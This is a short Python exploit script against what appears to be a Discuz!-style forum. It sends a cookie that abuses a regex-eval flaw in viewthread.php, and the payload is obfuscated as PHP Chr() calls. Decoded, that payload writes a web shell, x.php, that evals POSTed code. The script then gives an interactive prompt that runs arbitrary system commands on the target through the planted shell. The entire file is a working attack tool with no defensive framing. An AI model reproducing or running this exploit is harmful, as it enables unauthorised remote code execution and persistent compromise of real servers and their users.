import requests


RHOST=input("RHOST:")
RPORT=input("RPORT:")

header={"cookie":"GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(120).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(112).Chr(119).Chr(100).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))"}
res=requests.get(url=f"http://{RHOST}:{RPORT}/viewthread.php?tid=13&extra=page%3D1",headers=header)
print("uploaded x.php")


while True:
    cmd=input("$:")
    data={"pwd":f"system(\"{cmd}\");"}
    res=requests.post(f"http://{RHOST}:{RPORT}/x.php",data=data)
    print(res.text,end="")

